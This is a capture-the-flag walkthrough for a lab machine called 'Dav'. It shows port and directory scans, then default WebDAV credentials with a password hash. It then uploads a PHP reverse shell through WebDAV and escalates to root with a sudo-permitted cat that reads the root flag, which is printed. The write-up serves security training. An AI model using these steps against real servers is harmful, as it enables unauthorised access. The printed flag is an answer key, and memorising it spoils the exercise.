---
layout: default
title: Dav
parent: Easy
nav_order: 8
---

# Dav
`nmap -A -p- 10.66.138.190`
```diff
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-04 02:19 -0600
Nmap scan report for 10.66.138.190
Host is up (0.036s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 3 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   34.52 ms 192.168.128.1
2   ...
3   36.52 ms 10.66.138.190

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.97 seconds
```
`gobuster dir --url http://10.66.138.190 -w /usr/share/seclists/Discovery/Web-Content/common.txt`
```diff
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.66.138.190
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 297]
/.htaccess            (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 292]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 301]
+/webdav               (Status: 401) [Size: 460]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```
`/.htpasswd`
```diff
Forbidden
You don't have permission to access /.htpasswd on this server.
```
`/.htaccess`
```diff
Forbidden
You don't have permission to access /.htaccess on this server.
```
`/.hta`
```diff
Forbidden
You don't have permission to access /.hta on this server.
```
`/server-status`
```diff
Forbidden
You don't have permission to access /server-status on this server.
```
`/webdav`
- Username: `wampp`
- Password: `xampp`

Found
`passwd.dav`, 
```
wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
```
`davtest -url http://<IP>/webdav -auth 'wampp:xampp'`
```diff
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.65.151.166/webdav
********************************************************
NOTE    Random string for this session: bswOC57FjH
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.65.151.166/webdav/DavTestDir_bswOC57FjH
********************************************************
 Sending test files
PUT     jhtml   SUCCEED:        http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.jhtml
PUT     asp     SUCCEED:        http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.asp
PUT     cfm     SUCCEED:        http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.cfm
PUT     aspx    SUCCEED:        http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.aspx
PUT     cgi     SUCCEED:        http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.cgi
PUT     pl      SUCCEED:        http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.pl
PUT     shtml   SUCCEED:        http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.shtml
PUT     txt     SUCCEED:        http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.txt
PUT     jsp     SUCCEED:        http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.jsp
PUT     php     SUCCEED:        http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.php
PUT     html    SUCCEED:        http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.html
********************************************************
 Checking for test file execution
EXEC    jhtml   FAIL
EXEC    asp     FAIL
EXEC    cfm     FAIL
EXEC    aspx    FAIL
EXEC    cgi     FAIL
EXEC    pl      FAIL
EXEC    shtml   FAIL
EXEC    txt     SUCCEED:        http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.txt
EXEC    txt     FAIL
EXEC    jsp     FAIL
EXEC    php     SUCCEED:        http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.php
EXEC    php     FAIL
EXEC    html    SUCCEED:        http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.html
EXEC    html    FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.65.151.166/webdav/DavTestDir_bswOC57FjH
PUT File: http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.jhtml
PUT File: http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.asp
PUT File: http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.cfm
PUT File: http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.aspx
PUT File: http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.cgi
PUT File: http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.pl
PUT File: http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.shtml
PUT File: http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.txt
PUT File: http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.jsp
PUT File: http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.php
PUT File: http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.html
Executes: http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.txt
Executes: http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.php
Executes: http://10.65.151.166/webdav/DavTestDir_bswOC57FjH/davtest_bswOC57FjH.html
```
`cadaver http://<Target-IP-Address>:80/webdav/`

`put php-reverse-shell.php`

Check user permissions
`sudo -l`
```diff
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```
- The user can execute the cat command with sudo privileges
`sudo cat /root/root.txt`

`101101ddc16b0cdf65ba0b8a7af7afa5`